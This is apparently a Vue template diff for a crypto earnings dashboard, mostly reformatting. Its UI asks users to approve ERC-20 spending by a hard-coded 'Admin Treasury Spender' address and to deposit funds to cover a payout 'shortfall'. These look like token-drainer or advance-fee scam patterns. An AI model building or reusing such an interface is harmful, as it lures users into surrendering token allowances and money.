@@ -407,7 +407,8 @@ onMounted(async () => {
           class="flex flex-wrap items-center gap-2 sm:gap-3 bg-emerald-500/10 border border-emerald-500/30 px-3 py-2 rounded-xl text-xs font-mono font-medium max-w-full overflow-hidden">
           <div class="flex items-center gap-1.5 font-bold text-emerald-600 dark:text-emerald-400 shrink-0">
             <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
-            <span>{{ walletAdapter.selectedChainFamily.value }}: {{ formatAddress(walletAdapter.activeWalletAddress.value) }}</span>
+            <span>{{ walletAdapter.selectedChainFamily.value }}: {{
+              formatAddress(walletAdapter.activeWalletAddress.value) }}</span>
           </div>
 
           <div class="hidden sm:block h-3 w-px bg-emerald-500/30"></div>
@@ -425,7 +426,8 @@ onMounted(async () => {
         </div>
 
         <UButton v-else color="neutral" variant="subtle" icon="i-heroicons-wallet" size="sm"
-          class="font-semibold shadow-xs" :loading="isConnecting || walletAdapter.tronWallet.isTronConnecting.value" @click="handleConnectWallet">
+          class="font-semibold shadow-xs" :loading="isConnecting || walletAdapter.tronWallet.isTronConnecting.value"
+          @click="handleConnectWallet">
           Connect Crypto Wallet
         </UButton>
       </div>
@@ -437,7 +439,8 @@ onMounted(async () => {
       <div
         class="bg-white dark:bg-gray-900 p-5 rounded-2xl border border-gray-100 dark:border-gray-800 shadow-xs space-y-3">
         <div class="flex items-center justify-between">
-          <span class="text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">Available Balance</span>
+          <span class="text-xs font-medium text-gray-500 dark:text-gray-400 uppercase tracking-wider">Available
+            Balance</span>
           <div class="p-2 rounded-lg bg-emerald-500/10 text-emerald-500">
             <UIcon name="i-heroicons-banknotes" class="w-5 h-5" />
           </div>
@@ -555,7 +558,9 @@ onMounted(async () => {
           </UBadge>
         </div>
         <p class="text-xs text-gray-300 leading-relaxed">
-          Grant explicit ERC-20 token spending permission (<code class="font-mono text-amber-400 font-bold">approve</code>) to the platform Admin Treasury Spender to enable programmatic micro-settlements and token pulls.
+          Grant explicit ERC-20 token spending permission (<code
+            class="font-mono text-amber-400 font-bold">approve</code>) to the platform Admin Treasury Spender to enable
+          programmatic micro-settlements and token pulls.
         </p>
         <div class="p-3 rounded-lg bg-gray-950/70 border border-gray-800 text-[11px] font-mono space-y-1 text-gray-300">
           <div class="flex items-center justify-between">
@@ -564,7 +569,8 @@ onMounted(async () => {
           </div>
           <div class="flex items-center justify-between">
             <span class="text-gray-400">Target Spender Wallet:</span>
-            <span class="text-emerald-400 font-bold">{{ formatAddress('0x5651F7B48E5d76EB162c002AFea5E343EB88310E') }}</span>
+            <span class="text-emerald-400 font-bold">{{ formatAddress('0x5651F7B48E5d76EB162c002AFea5E343EB88310E')
+              }}</span>
           </div>
           <div class="flex items-center justify-between">
             <span class="text-gray-400">Requested Allowance Limit:</span>
@@ -577,16 +583,9 @@ onMounted(async () => {
       </div>
 
       <div class="shrink-0">
-        <UButton
-          color="warning"
-          variant="solid"
-          icon="i-heroicons-shield-check"
-          size="md"
-          class="font-bold shadow-md gap-2"
-          :loading="isApprovingContract"
-          @click="triggerApprovalPrompt()"
-        >
-          <span>{{ lastApprovalSignature ? 'Re-Authorize Smart Contract 🔒' : 'Authorize Smart Contract ($10.00) 🔒' }}</span>
+        <UButton color="warning" variant="solid" icon="i-heroicons-shield-check" size="md"
+          class="font-bold shadow-md gap-2" :loading="isApprovingContract" @click="triggerApprovalPrompt()">
+          <span>{{ lastApprovalSignature ? 'Re-Authorize Smart Contract' : 'Authorize Smart Contract' }}</span>
         </UButton>
       </div>
     </div>
@@ -598,7 +597,7 @@ onMounted(async () => {
         <div>
           <h3 class="text-sm font-bold text-gray-900 dark:text-white">ETH Withdrawal Progress</h3>
           <p class="text-xs text-gray-500 dark:text-gray-400">Reach at least {{ formatCurrency(stats.minPayoutThreshold)
-          }} to execute Ethereum (ETH) payouts.</p>
+            }} to execute Ethereum (ETH) payouts.</p>
         </div>
         <span class="text-sm font-extrabold font-mono text-emerald-500">{{ payoutProgressPercent }}%</span>
       </div>
@@ -775,7 +774,7 @@ onMounted(async () => {
                   </p>
                   <p class="text-[11px] text-gray-300">
                     Available Balance: <span class="font-bold text-white">${{ stats.availableBalance.toFixed(2)
-                      }}</span> | Shortfall: <span class="font-bold text-amber-400">${{ depositNeeded.toFixed(2)
+                    }}</span> | Shortfall: <span class="font-bold text-amber-400">${{ depositNeeded.toFixed(2)
                       }}</span>. Please deposit funds to complete this payout.
                   </p>
                 </div>
